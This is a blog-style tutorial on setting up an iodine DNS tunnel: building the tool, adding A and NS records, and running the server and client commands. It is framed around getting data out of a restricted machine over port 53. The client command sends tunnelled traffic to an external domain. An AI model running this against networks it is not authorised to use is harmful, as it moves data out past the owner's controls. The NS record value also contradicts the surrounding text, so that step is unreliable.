---
title: "Configuring Iodine"
date: 2021-05-19T10:08:56-08:00
draft: false
tags: 
- oob
- dns
- exfiltration
---
# Setting up and Using Iodine
## Introduction
What is Iodine? Rather than defining it, let's start with an example. Let's say you have physical access to a box and you desperately need to exfiltrate some data. However, you quickly discover that you cannot connect outbound on any port except 53. Basic protocol checks prevent you from simply configuring an FTP server on port 53 of your cloud server. And to throw another wrench into the gears, it seems like they have locked you into a set of standard public DNS servers anyway. How will you get any data out through just DNS destined for Google or Cloudflare servers? This is where Iodine comes in. (Some have also noted Iodine's usefulness in getting free wifi on planes and in hotels but we are not doing this)

Iodine provides a DNS tunnel on which other protocols such as HTTP or FTP can piggy back, allowing us to upload files with just access to public DNS servers. For more information on how non-DNS data may be carried over DNS, see our previous [blog](https://svl.sh/oob-dns/) on out-of-band DNS.

## What you need
- A domain. Grab one off Namecheap or Godaddy, to name a couple domain name registrars.
- A server to receive the DNS requests. A cloud server or virtual private server ("VPS") will be easiest, since it already has a public address and we won't need to port forward anything.
- A target. Probably one that has some painful networking restrictions.


## Step 1: Set up your server
First, create an Ubuntu server on your VPS provider of choice. On that server:
- Make sure you disable any conflicting DNS services on port 53. See other blogs on Linux sysadmin basics for more information on the command to use. Most likely, the following command will work:
```bash
systemctl stop systemd-resolved
```
You can also run `apt update` and `apt upgrade` as needed. This should not be an issue because you just made the VPS, and it should be a relatively new image. But it is good practice and may fix problems with outdated packages.

Let's compile and install the server binary (both the client and server binary are the same, just run with different arguments and flags).
First, clone the repository to your system.
```bash
git clone https://github.com/yarrick/iodine.git
```
Once the iodine repo is in your current directory, enter the directory with:
```bash
cd iodine
```
Ensure that you have the libz-dev installed. This library, used for data compression, is necessary for the compilation process (transporting data over DNS means that data compression is going to play a big role in maximizing throughput). Install the package using:
```bash
apt install libz-dev
```
Now we compile the app using:
```bash
make
```
And now install it (installing in general is moving files to the right locations for execution; here, we just move the compiled binary to a directory in the path). Use the command:
```bash
make install
```

##  Step 2: Configure your DNS entries
Next we need to ensure that DNS requests can reach our server. 
Our first entry will be to give our "DNS" server an FQDN. Go to your domain registrar's website and open the DNS settings for the domain you want to use.

We will start by adding an A record that will point to the IP of your hosted server. The entry should look something like the following, depending on your registrar's web site:
|Type |Host |Value | TTL |
|A Record | ns | IP Address | Auto |
An A record is one of the simplest types of records, and it determines what IP to direct traffic to when a certain hostname is requested. In this example, let's say you bought `testeroni.com`. The above record will direct any traffic destined for `ns.testeroni.com` to the IP address you specify. If you wanted another host on this domain, you can give it another name like `computer1` and it would be reachable on `computer1.testeroni.com`.

Now to get DNS traffic to our `ns.testeroni.com` host, we need to configure it to be the resolver for a subdomain we setup. For example, our subdomain can be called `s.testeroni.com`, any requests to resolve `[somehost].s.testeroni.com` will go to a specified name server. In this case, we will sit it to `ns.testeroni.com`.
|Type |Host |Value | TTL |
|NS Record | s | ns.potato.monster. | Auto |

Just as a recap, we have a subdomain called `s` of our domain `testeroni.com`. Any host information is specified before `s.testeroni.com`.

## Start up the server
```bash
iodined  -f -c -P [password] 192.168.77.1 s.testeroni.com
```
We will start with the `-f` option to start iodined in the foreground; this is going to help with troubleshooting. `-c` is used for compression, `-P` is to specify the password.
The IP address is the address you want for the *tunnel*. This should be a different subnet than your local network. You use these IPs to communicate between the two hosts through the tunnel. 

## Start the client program
```bash
iodine -f -P [password] s.testeroni.com
```
Here, we start the client program with a similar command, but note the lack of the d for daemon at the end. The client program will attempt to connect to the server using just DNS. Data will be encoded in the host section of the subdomain like so `[data].s.testeroni.com`.

## Test the connection
To test if the tunnel is configured properly, try using the following command from your client (and vice versa):
```bash
ping <tunnel-IP-of-server>
```
Any traffic that you need tunneled through DNS can simply be directed towards the server's tunnel IP. For specific application traffic to be forwarded, configure proxies (see http or SOCKS proxies) that will handle requests using the less restricted server side.

